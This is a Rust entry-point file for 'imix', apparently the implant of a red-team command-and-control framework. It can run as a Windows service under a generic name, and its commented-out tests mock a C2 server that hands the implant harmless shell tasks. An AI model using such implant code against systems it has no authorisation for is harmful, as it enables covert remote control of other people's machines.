#[cfg(win_service)]
#[macro_use]
extern crate windows_service;

use anyhow::Result;
use imix::standard_main;

#[cfg(win_service)]
use windows_service::service_dispatcher;

#[cfg(win_service)]
use imix::win_service::service_main;

#[cfg(win_service)]
define_windows_service!(ffi_service_main, service_main);

pub fn main() -> Result<(), imix::Error> {
    #[cfg(win_service)]
    match service_dispatcher::start("myservice", ffi_service_main) {
        Ok(_) => {}
        Err(local_err) => {
            #[cfg(debug_assertions)]
            eprintln!(
                "Failed to start imix as a service: {}",
                local_err.to_string()
            );
        }
    }

    match standard_main(None) {
        Ok(_) => {}
        Err(local_err) => {
            #[cfg(debug_assertions)]
            eprintln!("Failde to start imix: {}", local_err);
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {

    #[test]
    fn imix_handle_exec_tome() {}
    //     #[test]
    //     fn imix_test_main_loop_sleep_twice_short() -> Result<()> {
    //         // Response expectations are poped in reverse order.
    //         let server = Server::run();
    //         let test_task_id = "17179869185".to_string();
    //         let post_result_response = GraphQLResponse {
    //             data: Some(SubmitTaskResult {
    //                 id: test_task_id.clone(),
    //             }),
    //             errors: None,
    //             extensions: None,
    //         };
    //         server.expect(
    //             Expectation::matching(all_of![
    //                 request::method_path("POST", "/graphql"),
    //                 request::body(matches(".*variables.*execStartedAt.*"))
    //             ])
    //             .times(1)
    //             .respond_with(status_code(200).body(serde_json::to_string(&post_result_response)?)),
    //         );

    //         let test_task = Task {
    //             id: test_task_id,
    //             quest: Quest {
    //                 id: "4294967297".to_string(),
    //                 name: "Exec stuff".to_string(),
    //                 parameters: None,
    //                 tome: Tome {
    //                     id: "21474836482".to_string(),
    //                     name: "sys exec".to_string(),
    //                     description: "Execute system things.".to_string(),
    //                     param_defs: None,
    //                     eldritch: r#"
    // def test():
    // if sys.is_macos():
    // sys.shell("sleep 3")
    // if sys.is_linux():
    // sys.shell("sleep 3")
    // if sys.is_windows():
    // sys.shell("timeout 3")
    // test()
    // print("main_loop_test_success")"#
    //                         .to_string(),
    //                     files: None,
    //                 },
    //                 bundle: None,
    //             },
    //         };
    //         let claim_task_response = GraphQLResponse {
    //             data: Some(ClaimTasksResponseData {
    //                 claim_tasks: vec![test_task.clone(), test_task.clone()],
    //             }),
    //             errors: None,
    //             extensions: None,
    //         };
    //         server.expect(
    //             Expectation::matching(all_of![
    //                 request::method_path("POST", "/graphql"),
    //                 request::body(matches(".*variables.*hostPlatform.*"))
    //             ])
    //             .times(1)
    //             .respond_with(status_code(200).body(serde_json::to_string(&claim_task_response)?)),
    //         );
    //         let url = server.url("/graphql").to_string();

    //         let tmp_file_new = NamedTempFile::new()?;
    //         let path_new = String::from(tmp_file_new.path().to_str().unwrap()).clone();
    //         let _ = std::fs::write(
    //             path_new.clone(),
    //             format!(
    //                 r#"{{
    //     "service_configs": [],
    //     "target_forward_connect_ip": "127.0.0.1",
    //     "target_name": "test1234",
    //     "callback_config": {{
    //         "interval": 4,
    //         "jitter": 0,
    //         "timeout": 4,
    //         "c2_configs": [
    //         {{
    //             "priority": 1,
    //             "uri": "{url}"
    //         }}
    //         ]
    //     }}
    // }}"#
    //             ),
    //         );

    //         let runtime = tokio::runtime::Builder::new_multi_thread()
    //             .enable_all()
    //             .build()
    //             .unwrap();

    //         // Define a future for our execution task
    //         let start_time = Utc::now().time();
    //         let exec_future = main_loop(path_new, Some(1));
    //         let _result = runtime.block_on(exec_future).unwrap();
    //         let end_time = Utc::now().time();
    //         let diff = (end_time - start_time).num_milliseconds();
    //         assert!(diff < 4500);
    //         Ok(())
    //     }

    //     #[test]
    //     fn imix_test_main_loop_run_once() -> Result<()> {
    //         let test_task_id = "17179869185".to_string();

    //         // Response expectations are poped in reverse order.
    //         let server = Server::run();

    //         let post_result_response = GraphQLResponse {
    //             data: Some(SubmitTaskResult {
    //                 id: test_task_id.clone(),
    //             }),
    //             errors: None,
    //             extensions: None,
    //         };
    //         server.expect(
    //             Expectation::matching(all_of![
    //                 request::method_path("POST", "/graphql"),
    //                 request::body(matches(".*variables.*execStartedAt.*"))
    //             ])
    //             .times(1)
    //             .respond_with(status_code(200).body(serde_json::to_string(&post_result_response)?)),
    //         );

    //         let claim_task_response = GraphQLResponse {
    //             data: Some(ClaimTasksResponseData {
    //                 claim_tasks: vec![Task {
    //                     id: test_task_id.clone(),
    //                     quest: Quest {
    //                         id: "4294967297".to_string(),
    //                         name: "Exec stuff".to_string(),
    //                         parameters: Some(r#"{"cmd":"echo main_loop_test_success"}"#.to_string()),
    //                         tome: Tome {
    //                             id: "21474836482".to_string(),
    //                             name: "sys exec".to_string(),
    //                             description: "Execute system things.".to_string(),
    //                             param_defs: Some(r#"[{"name":"cmd","type":"string"}]"#.to_string()),
    //                             eldritch: r#"print(sys.shell(input_params["cmd"]))"#.to_string(),
    //                             files: None,
    //                         },
    //                         bundle: None,
    //                     },
    //                 }],
    //             }),
    //             errors: None,
    //             extensions: None,
    //         };
    //         server.expect(
    //             Expectation::matching(all_of![
    //                 request::method_path("POST", "/graphql"),
    //                 request::body(matches(".*variables.*hostPlatform.*"))
    //             ])
    //             .times(1)
    //             .respond_with(status_code(200).body(serde_json::to_string(&claim_task_response)?)),
    //         );
    //         let url = server.url("/graphql").to_string();

    //         let tmp_file_new = NamedTempFile::new()?;
    //         let path_new = String::from(tmp_file_new.path().to_str().unwrap()).clone();
    //         let _ = std::fs::write(
    //             path_new.clone(),
    //             format!(
    //                 r#"{{
    //     "service_configs": [],
    //     "target_forward_connect_ip": "127.0.0.1",
    //     "target_name": "test1234",
    //     "callback_config": {{
    //         "interval": 4,
    //         "jitter": 1,
    //         "timeout": 4,
    //         "c2_configs": [
    //         {{
    //             "priority": 1,
    //             "uri": "{url}"
    //         }}
    //         ]
    //     }}
    // }}"#
    //             ),
    //         );

    //         let runtime = tokio::runtime::Builder::new_multi_thread()
    //             .enable_all()
    //             .build()
    //             .unwrap();

    //         let exec_future = main_loop(path_new, Some(1));
    //         let _result = runtime.block_on(exec_future)?;
    //         assert!(true);
    //         Ok(())
    //     }
}
